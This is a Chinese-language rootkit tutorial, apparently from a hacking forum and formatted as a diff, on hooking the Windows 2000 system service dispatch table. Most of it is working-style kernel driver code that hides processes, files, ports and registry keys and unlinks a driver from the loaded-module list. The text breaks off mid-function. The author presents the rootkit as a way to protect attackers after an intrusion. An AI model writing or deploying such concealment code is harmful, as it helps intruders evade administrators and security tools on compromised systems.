@@ -1,0 +1,814 @@
+我们安全爱好者，都接触过Rootkit，它对我们入侵后的保护提供了强大的支持。现今比较流行的Rootkit有Hxdef，NtRootkit和AFX Rootkit，而且Hxdef和AFX Rootkit还提供了源代码，对我们的学习提供了很大的方便。这些Rootkit都是使用HOOK技术实现的，欺骗的是用户，而不是操作系统。使用HOOK开发Rootkit是比较简单的，虽然现在也有很多其他的技术，但门槛都太高，很多技术都需要硬编码，对于我等菜鸟，实在是没有这么高深的技术。而HOOK就不同了，它开发简单，兼容性好，而且它几乎是你在编程道路上的一项必学技术，因为太多地方需要HOOK了，使用HOOK开发Rootkit不过是其中的一个应用而已，也是学习HOOK的一项比较好的实践机会。好了，进入正题，本文涉及的内容虽然不深，但也需要你有Windows编程以及驱动程序设计的基础。另外，本文的所有内容均在Windows 2000 SP4下测试成功，如无特殊提示，所以内容都是以Windows 2000 SP4、Intel x86为平台介绍的。
+
+一、序言
+
+针对本文开发的Rootkit，我们常常把它称作Hook System Call、Sysem Service Call或System Service Dispatching，更正规的说法是Hook Windows系统服务调用，它是系统中的一个关键接口，提供了系统由用户态切换到内核态的功能。我们知道，一般处理器可以提供从Ring0到Ring3四种处理器模式，其中必须提供2种，就是Ring0和Ring3。一些特殊的处理器指令只能在内核模式执行，一些高端内存也必须在内核模式下才能访问（可以通过内存映射的方法解决，请参考其他文章，本文不做介绍）。Windows系统就是利用了这2个处理器模式，将系统的关键组件保护起来，只有在内核模式才可以访问，并提供了一个上层接口，供用户程序访问，一切都是在MS的管理之下（悲哀啊！）。下面是Windowx体系结构的简略图。
+
+[-------------------Windowx体系结构---------------------]
+系统进程，服务进程，应用程序，环境子系统
+应用程序编程接口（API）
+基于NTDLL.DLL的本地系统服务
+（用户模式）
+---------------------------------------------------------------
+（内核模式）
+系统服务调用（SSDT）
+执行体（Executive）
+系统内核，设备驱动（Kernel）
+硬件抽象层（HAL）
+
+二、Windows系统服务调用
+
+1.机制
+Windows 2000的陷阱调度（Trap Dispatching）机制包括了：中断（Interrupt），延迟过程调用（Deferred Procedure Call），异步过程调用（Asynchronous Procedure Call），异常调度（Exception Dispatching）和系统服务调用（System Service Call）。在Intel x86平台的Windows 2000使用int 0x2e指令进入Windows系统服务调用；Windows XP使用sysenter指令使系统陷入系统服务调用程序中；而AMD平台的Windows XP系统使用syscall指令进入Windows系统服务调用。下面是Intel x86平台的Windows 2000的系统服务调用模型。
+
+mov eax, ServiceId 
+lea edx, ParameterTable
+int 2eh
+ret ParamTableBytes
+
+其中ServiceId是传递给系统服务调用程序的ID号，内核使用这个ID号来查找系统服务调度表（System Service Dispath Table）中的对应系统服务信息。在系统服务调度表中，每一项都包含了一个指向具体的系统服务程序的指针，我们就是需要HOOK这个指针，使其指向我们自定义的代码（稍后会详述）。ParameterTable是传递的参数，系统服务调用程序KiSystemService函数会严格检查传递的每一个参数，并将其参数从线程的用户内存中复制到系统的内存中，以便内核可以访问。执行的int指令会导致陷阱发生，所以Windows 2000内的中断描述表（Interrupt Descriptor Table）中的0x2e指向了系统服务调用程序。最后的ParamTableBytes是返回的参数个数的信息。
+其实，系统服务调用也是一个接口，是面向Windows内核的接口。它实现了将用户模式下的请求转发到内核模式下，并引发了处理器模式的切换。在用户看来，系统服务调用就是与Windows内核通信的一个桥梁。
+2.类型
+在Windows 2000中默认存在两个系统服务调度表，它们对应了两类不同的系统服务。这两个系统服务调度表分别是：KeServiceDescriptorTable和KeServiceDescriptorTableShadow。前者有ntoskrnl.exe导出，后者由Win32k.sys导出。在系统中，有三个DLL是最重要的：Kernel32.dll、User32.dll和Gdi32.dll，这些DLL导出的函数，都是通过某种类型的中断进入内核态，然后调用ntoskrnl.exe或Win32k.sys中的函数。函数KeAddSystemServiceTable允许Win32.sys和其他设备驱动程序添加系统服务表。除了Win32k.sys服务表外，使用KeAddSystemServiceTable添加的服务表会被同时复制到KeServiceDescriptorTable和KeServiceDescriptorTableShadow中去。
+●注：由于本文的Rootkit只针对KeServiceDescriptorTable，KeServiceDescriptorTableShadow只会稍微提及一些，不会详述。●
+另外在提一下，NTDLL.DLL和ntoskrnl.exe的关系很“微妙”，用户态和内核态的调用也是有分别的，比如：参数检查。还有Native API导出了2套函数：Zw***和Nt***，要想彻底了解这些内容，推荐看Sunwear写的《浅析本机API》，我们的论坛原创版有这篇文章http://www.eviloctal.com/forum/index.php。
+综上所述，Kernel32.dll/Advapi32.dll进入NTDLL.DLL后，使用int 0x2e中断进入内核，最后在ntoskrnl.exe中实现了真正的函数调用；User32.dll和Gdi32.dll则在Win32k.sys中实现了真正的函数调用。
+
+三、HOOK系统服务
+
+HOOK系统服务，首先需要定位系统服务调度表，这里需要一个未公开的ntoskrnl.exe导出单元KeServiceDescriptorTable，它对应一个简单的数据结构，使用它完成对系统服务调度表的修改。
+
+typedef struct servicetable
+{
+UINT *ServiceTableBase;
+UINT *ServiceCounterTableBase;
+UINT NumberOfService;
+UCHAR *ParamerterTableBase;
+}ServiceDescriptorTableEntry,*PServiceDescriptorTableEntry;
+
+ServiceTableBase指向系统服务程序的地址，我们需要对它进行HOOK，使这个地址指向我们的代码。ParamerterTableBase是参数列表的地址，它们都包含了NumberOfService这么多个单元。
+我们先用SoftICE分析一下系统服务调度表。使用ntcall命令可以列出系统中的系统服务调度表，但不同的系统，不同的SP补丁，系统服务调度表肯定是不会相同的，因为MS随时都会修改此表。Ntcall命令的输出类似这样：
+000A 0008:8049860A params=06 NtAdjustPrivilegesToken
+000A是它的序号，8049860A是其地址，params=06表示有6个参数，NtAdjustPrivilegesToken就是函数名了，对应的API是AdjustPrivilegesToken。Win32k.sys导出的系统服务调度表位于KeServiceDescriptorTable+50h处，ServiceID从1000h开始，其结构基本和ntoskrnl.exe一样。我们具体看一下，由于SoftICE的输出非常多，这里只节选一小部分。
+
+:dd KeServiceDescriptorTable l 4*4
+//如果要查看Win32k.sys，则使用dd KeServiceDescriptorTable+50 l 4*4
+0008:8047F7E0 80471128 00000000 000000F8 8047150C ……
+……
+8047F7E0为KeServiceDescriptorTable的地址，80471128为ServiceTableBase的地址，000000F8为NumberOfService，8047150C为ParamerterTableBase。
+:dd @KeServiceDescriptorTable l byte(@(KeServiceDescriptorTable+08))*4
+0008:80471128 804C3D66 804F7F84 804FADF2 804F7FAE ……
+……
+80471128地址处为ServiceID=0的系统服务入口地址。在来看一下参数列表。
+:dd @(KeServiceDescriptorTable+0c) l byte(@(KeServiceDescriptorTable+08))
+0008:8047150C 2C2C2018 44402C40 0818180C 100C0404 ……
+:db @(KeServiceDescriptorTable+0c) l byte(@(KeServiceDescriptorTable+08))
+0008:8047150C 18 20 2C 2C 40 2C 40 44 0C 18 18 08 04 04 0C 10 ……
+
+18 20 2C 2C，这里的18表示参数个数，即18h/4=6。根据上面的分析，我们只要修改ServiceTableBase到ServiceTableBase+NumberOfService*4范围的数据就可以改变系统服务的执行流程；修改ServiceID就可以改变这一个系统服务的入口地址，我以ZwQuerySystemInformation为例说明一下。
+
+:u ZwQuerySystemInformation
+ntoskrnl!ZwQuerySystemInformation
+0008:8042F288 MOV EAX, 00000097
+0008:8042F280 LEA EDX, [ESP+04]
+0008:8042F291 INT 2E
+0008:8042F293 RET 0010
+
+使用ZwQuerySystemInformation的线性地址+1，就可以定位ServiceID，即入口地址，将这个地址指向我们的函数，就大功告成了。首先需要将KeServiceDescriptorTable引入，这样才能操作系统服务调度表。
+__declspec(dllimport) ServiceDescriptorTableEntry KeServiceDescriptorTable;
+
+然后定义一个宏，参数是需要HOOK函数的线性地址。
+#define SYSCALL(_Function) 
+KeServiceDescriptorTable.ServiceTableBase[*(ULONG *)((UCHAR *)_Function+1)]
+
+将_Function+1即可确定ServiceID的位置，即在系统服务调度表中的入口地址。有了这个宏，就可以“自由”的将地址指向“任何”位置，我以ZwQuerySystemInformation为例进行演示。首先定义一个typedef函数指针，用于保存原ZwQuerySystemInformation的地址。
+
+typedef NTSTATUS (*ZWQUERYSYSTEMINFORMATION) (
+IN ULONG SystemInformationClass,
+……);
+ 
+声明ZWQUERYSYSTEMINFORMATION OldZwQuerySystemInformation; 然后定义HOOK函数。
+
+NTSTATUS NewZwQuerySystemInformation (
+……);
+
+最后还差一个线性地址的函数，这个函数需要遵循DDK函数的调用约定，它什么工作都不做，只是帮助我们得到线性地址，进而在系统服务调度表中找到入口地址。
+
+NTSYSAPI NTSTATUS NTAPI ZwQuerySystemInformation (
+……);
+
+万事具备，只欠东风。使用SYSCALL宏保存原函数地址，然后指向新函数。
+
+OldZwQuerySystemInformation=(ZWQUERYSYSTEMINFORMATION)(SYSCALL(ZwQuerySystemInformation)); //保存原函数地址
+_asm cli
+(ZWQUERYSYSTEMINFORMATION)(SYSCALL(ZwQuerySystemInformation))=NewZwQuerySystemInformation; //指向新函数
+_asm sti
+
+还原的时候只需将OldZwQuerySystemInformation的地址指向ServiceTableBase即可。
+
+_asm cli
+(ZWQUERYSYSTEMINFORMATION)(SYSCALL(ZwQuerySystemInformation))=OldZwQuerySystemInformation; //还原
+_asm sti
+
+这样就可以HOOK成功了。其实想想，不过是使用HOOK函数的线性地址确定在系统服务调度表中的入口地址，然后将这个入口地址指向新函数或旧函数，用SoftICE看看HOOK前后的系统服务调度表就明白了。
+下面的内容就是具体开发了，包括隐藏进程，文件/目录，端口，注册表，内核模块，服务/驱动，用户，需要说一下的是，隐藏服务/驱动，用户是用户态的HOOK，在隐藏服务的章节中，我会介绍用户态的HOOK，其他都是在内核下完成的。
+
+四、隐藏进程
+
+我们平常枚举进程，都是使用HelpTool库、Psapi库中的函数，这些函数最终会调用ZwQuerySystemInformation函数，所以只要HOOK这个函数，就可以隐藏进程，使类似任务管理器这样的工具不会发现隐藏的进程。HOOK的方法前边已经说过，所以这里只给出HOOK后函数的处理代码，很好理解。
+首先说说ZwQuerySystemInformation函数，使用它可以查询详细的系统信息，信息类型多达54种，我们在用户态使用的很多查询系统信息的API，其实最终都是调用的它。在这54种查询类型中，包含进程信息的有2个，一个是信息类型为5，另一个则为16，前者为系统的进程信息，后者为系统的句柄表，其中包含进程ID。这2个查询信息的方法是不同的，所以要分别HOOK。下面是ZwQuerySystemInformation函数的原型。
+NTSYSAPI NTSTATUS NTAPI ZwQuerySystemInformation (
+IN ULONG SystemInformationClass, //获取的系统信息类别
+IN OUT PVOID SystemInformation, //返回的信息指针
+IN ULONG SystemInforamtionLength, //长度
+OUT PULONG ReturnLength OPTIONAL); //实际的缓冲区大小
+如果SystemInformationClasss为5，那么SystemInformation会返回下面这个结构。
+typedef struct system_porcess
+{
+ULONG NextEntryDelta; //进程偏移
+ULONG ThreadCount; //线程数
+ULONG Reserved1[6]; //保留
+LARGE_INTEGER CreateTime; //进程创建时间
+LARGE_INTEGER KernelTime; //内核占用时间
+LARGE_INTEGER UserTime; //用户占用时间
+UNICODE_STRING ProcessName; //进程名
+KPRIORITY BasePriority; //优先级
+ULONG ProcessId; //进程ID
+ULONG InheritedProcessId; //父进程ID
+ULONG HandleCount; //句柄数
+ULONG Reserved2[2]; //保留
+VM_COUNTERS VmCounters; //VM信息
+IO_COUNTERS IoCounters; //IO信息
+SYSTEM_THREAD SystemThread[1]; //线程信息
+}SYSTEM_PROCESS,*LPSYSTEM_PROCESS;
+如果SystemInformationClasss为16，则返回下面这个结构。
+typedef struct system_handle_entry
+{
+ULONG ProcessId; //进程ID
+UCHAR ObjectType; //句柄类型
+UCHAR Flags; //标志
+USHORT HandleValue; //句柄的数值
+PVOID ObjectPointer; //句柄所指向的内核对象地址
+ACCESS_MASK GrantedAccess; //访问权限
+}SYSTEM_HANDLE_ENTRY,*LPSYSTEM_HANDLE_ENTRY;
+typedef struct system_handle_info
+{
+ULONG Count; //系统句柄数
+SYSTEM_HANDLE_ENTRY Handle[1]; //句柄信息
+}SYSTEM_HANDLE_INFORMATION,*LPSYSTEM_HANDLE_INFORMATION;
+对于信息类5，我们需要改变NextEntryDelta结构成员，它是进程列表的偏移地址。比如第一个进程信息在SystemInformation+0处，那么第二个信息就在SystemInformation+第一个NextEntryDelta处，依次类推，最后一个进程信息的NextEntryDelta就为0了。也就是说，如果要隐藏第一个进程，就向前移动缓冲区，移动的长度是第一个进程信息结构的大小；如果要隐藏中间的进程，则多加一个NextEntryDelta，就可以覆盖掉要隐藏的进程信息结构；如果要隐藏最后一个进程，将NextEntryDelta设置为0就可以了。
+对于信息类16，就没有什么偏移地址了，而是一个完整的缓冲区，我们要隐藏那个句柄，就向前移动SYSTEM_HANDLE_ENTRY结构的大小，覆盖掉要隐藏的数据。
+NTSTATUS NewZwQuerySystemInformation (
+IN ULONG SystemInformationClass,
+……)
+{
+......
+//请求原函数
+ntStatus=(OldZwQuerySystemInformation)(SystemInformationClass,……);
+//SystemInformationClass==16 枚举系统句柄表
+if (NT_SUCCESS(ntStatus) && SystemInformationClass==16)
+{
+//指向句柄表缓冲区
+lpSystemHandle=(LPSYSTEM_HANDLE_INFORMATION)SystemInformation;
+Num=lpSystemHandle->Count; //取得系统句柄数
+for (n=0; n<Num; n++)
+{
+//比较句柄表中的进程ID
+if (HIDDEN_SYSTEM_HANDLE==lpSystemHandle->Handle[n].ProcessId)
+{
+//向前移动句柄表缓冲区
+memcpy((lpSystemHandle->Handle+n),(lpSystemHandle->Handle+n+1),
+(Num-n-1) * sizeof (SYSTEM_HANDLE_ENTRY));
+Num--; //总数要--
+n--;
+}
+}
+}
+//SystemInformationClass==5 枚举系统进程
+if (NT_SUCCESS(ntStatus) && SystemInformationClass==5)
+{
+//指向进程列表缓冲区
+ProcCurr=(LPSYSTEM_PROCESS)SystemInformation;
+while (ProcCurr)
+{
+RtlUnicodeStringToAnsiString(&ProcNameAnsi,&ProcCurr->ProcessName,TRUE);
+if (_strnicmp(HIDDEN_SYSTEM_PROCESS,ProcNameAnsi.Buffer,
+strlen(ProcNameAnsi.Buffer))==0)
+{
+//移动进程偏移NextEntryDelta
+if (ProcPrev)
+{
+if (ProcCurr->NextEntryDelta)
+ProcPrev->NextEntryDelta+=ProcCurr->NextEntryDelta;
+else
+ProcPrev->NextEntryDelta=0;
+}
+else
+{
+if (ProcCurr->NextEntryDelta)
+SystemInformation=(LPSYSTEM_PROCESS)((TCHAR *)
+ProcCurr+ProcCurr->NextEntryDelta);
+else
+SystemInformation=NULL;
+}
+}
+ProcPrev=ProcCurr;
+//下一进程
+if (ProcCurr->NextEntryDelta)
+ProcCurr=(LPSYSTEM_PROCESS)((TCHAR *)
+ProcCurr+ProcCurr->NextEntryDelta);
+else
+ProcCurr=NULL;
+}
+}
+……
+return ntStatus;
+}
+HIDDEN_SYSTEM_HANDLE和HIDDEN_SYSTEM_PROCESS是2个宏，分别为隐藏的进程ID和进程名。下面介绍隐藏文件/目录。
+
+五、隐藏文件/目录
+
+枚举文件使用ZwQueryDirectoryFile函数，其原型如下：
+NTSYSAPI NTSTATUS NTAPI ZwQueryDirectoryFile (
+IN HANDLE hFile,
+IN HANDLE hEvent OPTIONAL,
+IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL,
+IN PVOID IoApcContext OPTIONAL,
+OUT PIO_STATUS_BLOCK pIoStatusBlock,
+OUT PVOID FileInformationBuffer,
+IN ULONG FileInformationBufferLength,
+IN FILE_INFORMATION_CLASS FileInfoClass,
+IN BOOLEAN ReturnOnlyOneEntry,
+IN PUNICODE_STRING FileName OPTIONAL,
+IN BOOLEAN RestartQuery);
+hFile为文件句柄，由ZwCrateFile或ZwOpenFile获得，FileInfoClass是一个不断变化的枚举类型，但只有4个同文件/目录有关。FileInformationBuffer是返回的信息指针。我们要隐藏文件/目录，就要处理这4个不同的枚举类型，它们的数值分别是：1、2、3和12，分别对应4个不同的结构，由于结构内容比较长，所以只介绍信息类为12的内容，其他可以在光盘中的FileInfo.txt中找到。信息类为12返回的结果如下：
+typedef struct file_name_info {
+ULONG NextEntryOffset; //文件偏移
+ULONG Unknown; //下一文件索引
+ULONG FileNameLength; //文件长度
+WCHAR FileName[1]; //文件名
+}FILE_NAMES_INFORMATION,*LPFILE_NAMES_INFORMATION;
+隐藏文件/目录的方法和隐藏进程基本上一样，如果没有文件/目录被找到，应该返回0x80000006。
+NTSTATUS NewZwQueryDirectoryFile (
+IN HANDLE hFile,
+……)
+{
+......
+//请求原函数
+ntStatus=((ZWQUERYDIRECTORYFILE)(OldZwQueryDirectoryFile)) (hFile,……);
+if (NT_SUCCESS(ntStatus) && FileInfoClass==12)
+{
+//指向文件列表缓冲区
+FileCurr=(LPFILE_NAMES_INFORMATION)FileInformationBuffer;
+do { 
+LastOne=!(FileCurr->NextEntryOffset); //取偏移
+FileNameLength=FileCurr->FileNameLength; //取长度
+RtlInitUnicodeString(&FileNameWide,FileCurr->FileName);
+RtlUnicodeStringToAnsiString(&FileNameAnsi,&FileNameWide,TRUE);
+if (_strnicmp(HIDDEN_SYSTEM_FILE,FileNameAnsi.Buffer,
+(FileNameLength / 2))==0)
+{
+//最后一个文件
+if (LastOne)
+{
+if (FileCurr==(LPFILE_NAMES_INFORMATION)
+FileInformationBuffer)
+ntStatus=0x80000006; //隐藏
+else
+FilePrev->NextEntryOffset=0;
+}
+else
+{
+//移动文件偏移
+Pos=((ULONG)FileCurr)-((ULONG)FileInformationBuffer);
+Left=(DWORD)FileInformationBufferLength-Pos-
+FileCurr->NextEntryOffset;
+RtlCopyMemory((PVOID)FileCurr,(PVOID)((char *)
+FileCurr+FileCurr->NextEntryOffset),(DWORD)Left);
+continue;
+}
+}
+//下一文件
+FilePrev=FileCurr;
+FileCurr=(LPFILE_NAMES_INFORMATION)((char *)
+FileCurr+FileCurr->NextEntryOffset);
+}while (!LastOne);
+}
+……
+return ntStatus;
+}
+HIDDEN_SYSTEM_FILE同样是宏，另外，文件长度是以Unicode统计的，一个字符占16位，而比较语句是以ANSI比较的，一个字符占8位，所以_strnicmp函数最后的比较大小是FileNameLength / 2，如果以Unicode比较，就不必除以2了。在来看看隐藏端口。
+
+六、隐藏端口
+
+枚举端口使用iphlpapi.dll中的函数，而它们最终调用的是ZwDeviceIoControlFile函数，使用它发送一个特定的IRP获取端口列表，所以只要HOOK了ZwDeviceIoControlFile函数，就可以隐藏端口。函数原型如下：
+NTSYSAPI NTSTATUS NTAPI ZwDeviceIoControlFile (
+IN HANDLE FileHandle,
+IN HANDLE Event OPTIONAL,
+IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
+IN PVOID ApcContext,
+OUT PIO_STATUS_BLOCK IoStatusBlock,
+IN ULONG IoControlCode,
+IN PVOID InputBuffer OPTIONAL,
+IN ULONG InputBufferLength,
+OUT PVOID OutputBuffer OPTIONAL,
+IN ULONG OutputBufferLength);
+FileHandle为通信设备的句柄，可以使用ZwQueryObject函数获得其具体信息，对于端口设备的，它的名字总是\Device\Tcp或\Device\Udp；IoControlCode为特定的I/O控制代码，表示要查询的信息。InputBuffer和OutputBuffer分别为输入输出缓冲。
+查询端口的I/O控制代码有2个，分别为：0x210012和0x120003，它们所返回的结构、分辨TCP/UDP端口都是不同的，需要分别对待。在我的Windows 2000 SP4下，Netstat使用0x120003，而Fport却使用0x210012。对于0x120003，返回的结构如下：
+typedef struct tcpaddrentry //TCP
+{
+ULONG TcpState; //状态
+ULONG TcpLocalAddr; //本地地址
+ULONG TcpLocalPort; //本地端口
+ULONG TcpRemoteAddr; //远程地址
+ULONG TcpRemotePort; //远程端口
+}TCPADDRENTRY,*LPTCPADDRENTRY;
+typedef struct udpaddrentry //UDP
+{
+ULONG UdpLocalAddr; //UDP只有本地地址
+ULONG UdpLocalPort; //端口
+}UDPADDRENTRY,*LPUDPADDRENTRY;
+很熟悉吧，这正是iphlpapi.dll中的函数返回的结构。对于这2个结构，还可以扩展，则会增加一个进程ID，不过只适用XP/2003，结构就不帖了，可以在RootkitMain.h中查找到。使用这个I/O控制代码进行端口查询，FileHandle的名字总是\Device\Tcp，所以区别TCP和UDP的方法是检查InputBuffer，包括判断是否为扩展结构。
+对于TCP查询，输入缓冲的特征是InputBuffer[0]为0x00，如果OutputBuffer中已经有了端口数据，则InputBuffer[17]为0x01，如果是扩展结构，则InputBuffer[16]为0x02。对于UDP查询，InputBuffer[0]就为0x01了，InputBuffer[16]和InputBuffer[17]的值和TCP查询是一样的。我们使用这3个值来区分TCP/UDP端口和是否为扩展结构，OutputBuffer返回的是完整的端口列表缓冲区，使用IoStatusBlock取得端口的数量，隐藏某个端口，就向前移动缓冲区。对于0x210012，返回的结构如下：
+typedef struct tdiconnectinfo
+{
+ULONG State;
+ULONG Event;
+ULONG TransmittedTsdus;
+ULONG ReceivedTsdus;
+ULONG TransmissionErrors;
+ULONG ReceiveErrors;
+LARGE_INTEGER Throughput;
+LARGE_INTEGER Delay;
+ULONG SendBufferSize;
+ULONG ReceiveBufferSize;
+BOOLEAN Unreliable;
+}TDI_CONNECTION_INFO,*LPTDI_CONNECTION_INFO;
+使用这个I/O控制代码进行端口查询，FileHandle的名字是\Device\Tcp或\Device\Udp，所以分别TCP或UDP不需要输入缓冲，而是使用ZwQueryObject函数获取句柄的名字。OutputBuffer返回的是单独的缓冲区，也就是说，一个端口返回一个，隐藏某个端口，就将返回值设置为STATUS_INVALID_ADDRESS即可。
+NTSTATUS NewZwDeviceIoControlFile (
+IN HANDLE FileHandle,
+......)
+{
+......
+//请求原函数
+ntStatus=((ZWDEVICEIOCONTROLFILE)(OldZwDeviceIoControlFile))(FileHandle,……);
+if ((NT_SUCCESS(ntStatus)) && (IoControlCode==0x210012))
+{
+//查询句柄名称 以便确定是TCP还是UDP
+if (NT_SUCCESS(ZwQueryObject(FileHandle,
+OBJECT_NAME_INFORMATION_CLASS,ObjectName,512,&RetLen)))
+{
+//指向端口列表缓冲区
+lpTdiConnInfo=(LPTDI_CONNECTION_INFO)OutputBuffer;
+RtlUnicodeStringToAnsiString(&ObjectNameAnsi,&ObjectName->Name,TRUE);
+//TCP端口
+if (_strnicmp(ObjectNameAnsi.Buffer,TCP_PORT_DEVICE,
+strlen(TCP_PORT_DEVICE))==0)
+{
+if (ntohs(lpTdiConnInfo->ReceivedTsdus)==HIDDEN_SYSTEM_PORT)
+ntStatus=STATUS_INVALID_ADDRESS; //隐藏
+}
+//UDP端口
+if (_strnicmp(ObjectNameAnsi.Buffer,UDP_PORT_DEVICE,
+strlen(UDP_PORT_DEVICE))==0)
+{
+if (ntohs(lpTdiConnInfo->ReceivedTsdus)==HIDDEN_SYSTEM_PORT) 
+ntStatus=STATUS_INVALID_ADDRESS; //隐藏
+}
+}
+}
+if ((NT_SUCCESS(ntStatus)) && (IoControlCode==0x120003))
+{
+if (NT_SUCCESS(ZwQueryObject(FileHandle,
+OBJECT_NAME_INFORMATION_CLASS,ObjectName,512,&RetLen)))
+{
+RtlUnicodeStringToAnsiString(&ObjectNameAnsi,&ObjectName->Name,TRUE);
+if (_strnicmp(ObjectNameAnsi.Buffer,TCP_PORT_DEVICE,
+strlen(TCP_PORT_DEVICE))==0)
+{
+if (((InBuf=(LPBYTE)InputBuffer)==NULL) || (InputBufferLength<17))
+//错误处理
+if ((InBuf[0]==0x00) && (InBuf[17]==0x01)) //TCP端口
+{
+if (InBuf[16]!=0x02) //非扩展结构
+{
+//获取端口个数
+Num=IoStatusBlock->Information / sizeof (TCPADDRENTRY);
+lpTcpAddrEntry=(LPTCPADDRENTRY)OutputBuffer;
+for (n=0; n<Num; n++)
+{
+if (ntohs(lpTcpAddrEntry[n].TcpLocalPort)==
+HIDDEN_SYSTEM_PORT)
+{
+//向前移动端口列表缓冲区
+memcpy((lpTcpAddrEntry+n),(lpTcpAddrEntry+n+1),
+((Num-n-1) * sizeof (TCPADDRENTRY)));
+Num--; //总数--
+n--;
+break;
+}
+}
+//隐藏后端口总数
+IoStatusBlock->Information=Num * sizeof (TCPADDRENTRY);
+...... 
+}
+}
+……
+}
+}
+}
+return ntStatus;
+}
+0x120003查询的UDP和处理扩展结构的代码就不帖了，和处理TCP一样，无非就是结构不同，隐藏都是memcpy移动缓冲。还有必须检查InBuf[17]是否为0x01，否则指向的OutputBuffer就是NULL指针了。下面的内容是隐藏注册表。
+
+七、隐藏注册表
+
+枚举注册表键和键值使用的Native API是ZwEnumerateKey和ZwEnumerateValueKey函数，它们所做的工作基本一样，都是使用索引获取键/键值，并返回一个缓冲区指针。ZwEnumerateKey函数原型如下，ZwEnumerateValueKey函数和它几乎一样，就不帖出来了。
+NTSYSAPI NTSTATUS NTAPI ZwEnumerateKey (
+IN HANDLE KeyHandle, //句柄
+IN ULONG Index, //请求的索引
+IN KEY_INFORMATION_CLASS KeyInformationClass, //获取的信息类型
+OUT PVOID KeyInformation, //返回的缓冲区指针
+IN ULONG Length, //长度
+OUT PULONG ResultLength); //实际长度
+DDK中公开了若干注册表函数，所以这2个函数的结构，枚举类型都已经定义好了，直接使用就可以了。KeyInformationClass一共4个值，可喜的是我们不必逐个处理，统一处理就可以了，因为只需要注册表键/键值名和其长度，而返回的这4个结构中都包含这2个结构成员，所以才可以统一处理。这里我们使用KEY_BASIC_INFORMATION结构。
+typedef struct _KEY_BASIC_INFORMATION {
+LARGE_INTEGER LastWriteTime;
+ULONG TitleIndex;
+ULONG NameLength;
+WCHAR Name[1]; 
+}KEY_BASIC_INFORMATION,*PKEY_BASIC_INFORMATION;
+这里我们需要的东西是Name和它的长度NameLength。而对于ZwEnumerateValueKey函数，我们使用KEY_VALUE_BASIC_INFORMATION结构（和KEY_BASIC_INFORMATION几乎一样，所以请查询DDK Documentation文档）。
+枚举注册表键/键值，是通过索引获取的，这样的话，我们隐藏了一个注册表键/键值，那其后的所有索引都需要改变。这里就需要有一个标界，理所当然是利用KeyHandle的值，不同子键的句柄值是不同的。举个例子，例如隐藏了KeyHandle为1下的某一个注册表键，那么其后KeyHandle为1下的所有索引（注册表键）都需要+1，而不是KeyHandle为1的就不需要加了。具体看一下代码，这里仍以ZwEnumerateKey函数为例。
+NTSTATUS NewZwEnumerateKey (
+IN HANDLE KeyHandle,
+......)
+{
+......
+static HANDLE RegHandle=NULL;
+static LONG RegIndex=0;
+if (RegHandle==KeyHandle) //同一句柄
+Index+=RegIndex; //加上隐藏的注册表键个数
+else
+{
+RegIndex=0; //否则重新赋值为0
+RegHandle=NULL;
+}
+//请求原函数
+ntStatus=((ZWENUMERATEKEY)(OldZwEnumerateKey)) (KeyHandle,……);
+if (NT_SUCCESS(ntStatus))
+{
+//指向注册表键缓冲区
+lpKeyBasic=(KEY_BASIC_INFORMATION *)KeyInformation);
+RtlInitUnicodeString(&RegsNameWide,lpKeyBasic->Name);
+RtlUnicodeStringToAnsiString(&RegsNameAnsi,&RegsNameWide,TRUE);
+if (_strnicmp(HIDDEN_SYSTEM_KEY,RegsNameAnsi.Buffer,
+(lpKeyBasic->NameLength / 2))==0)
+{
+RegHandle=KeyHandle; //取句柄值
+RegIndex++; //隐藏个数
+Index++; //索引加1
+//再次请求 跳过隐藏的注册表键
+ntStatus=((ZWENUMERATEKEY)(OldZwEnumerateKey)) (KeyHandle,……);
+}
+}
+……
+return ntStatus;
+}
+使用这种方法隐藏注册表键/键值，发现有时不同子键的KeyHandle值也是相同的，这就造成了多隐藏数据。解决的办法是HOOK了ZwOpenKey函数，使用ZwOpenKey函数的KeyHandle枚举键/键值（使用ZwEnumerateKey和ZwEnumerateValueKey函数），并记录下需要隐藏的索引，然后在ZwEnumerateKey或ZwEnumerateValueKey函数中Index参数进行比较，如果相等，就隐藏了（索引+1即可），这样上面的问题就可以解决了。如果想要做的更隐蔽，像ZwQueryKey、ZwDeleteKey等函数都需要HOOK，我这里只是演示程序，没写这么详细，这些内容就留给各位读者自己实践了（嘿嘿，这叫偷懒）。
+
+八、隐藏内核模块
+
+所谓内核模块，就是内核加载的驱动信息，DDK中的Drivers.exe可以枚举出系统的内核模块列表，它最终调用的是ZwQuerySystemInformation函数，信息类为11，表示获取系统的内核模块。如果要隐藏某个内核模块，就像上边介绍隐藏系统句柄一样，memcpy移动缓冲区，所以这里介绍另一种隐藏方法：从PsLoadedModuleList链上摘除内核模块。PsLoadedModuleList是系统中一个未公开的内核变量（LIST_ENTRY链表），保存着系统的内核模块。使用这种方法隐藏的关键是找到PsLoadedModuleList的地址，好在前人已经给出了方法，用驱动程序对象+14h即可定位PsLoadedModuleList。我们首先需要定义一个结构（这个结构虽然不是完整的，但我可以保证它正常工作）。GetPsLoadedModuleList函数查找PsLoadedModuleList的地址，HideAmlName函数隐藏内核模块，代码如下：
+typedef struct moduleentry
+{
+LIST_ENTRY ListEntry;
+DWORD Unknown[4];
+DWORD Base;
+DWORD DriverStart;
+DWORD Unknown1;
+UNICODE_STRING DriverPath;
+UNICODE_STRING DriverName;
+}MODULE_ENTRY,*LPMODULE_ENTRY;
+DWORD GetPsLoadedModuleList (IN PDRIVER_OBJECT DriverObject)
+{
+......
+if (DriverObject)
+{
+//驱动程序对象+14h处是PsLoadedModuleList地址
+if ((lpModuleEntry=*((LPMODULE_ENTRY *)
+((DWORD)DriverObject+0x14)))==NULL)
+{
+//错误处理
+}
+}
+return (DWORD)lpModuleEntry; //返回PsLoadedModuleList地址
+}
+NTSTATUS HideAmlName (TCHAR *HideModule)
+{
+if (ModuleEntry)
+CurrentModuleEntry=ModuleEntry;
+else
+return STATUS_UNSUCCESSFUL;
+//这是双向链表
+while ((LPMODULE_ENTRY)CurrentModuleEntry->ListEntry.Flink!=ModuleEntry)
+{
+if ((CurrentModuleEntry->Unknown1!=0) && 
+(CurrentModuleEntry->DriverPath.Length!=0))
+{
+RtlUnicodeStringToAnsiString(&DriverNameAnsi,
+&CurrentModuleEntry->DriverName,TRUE);
+if (_strnicmp(HideModule,DriverNameAnsi.Buffer,
+strlen(DriverNameAnsi.Buffer))==0)
+{
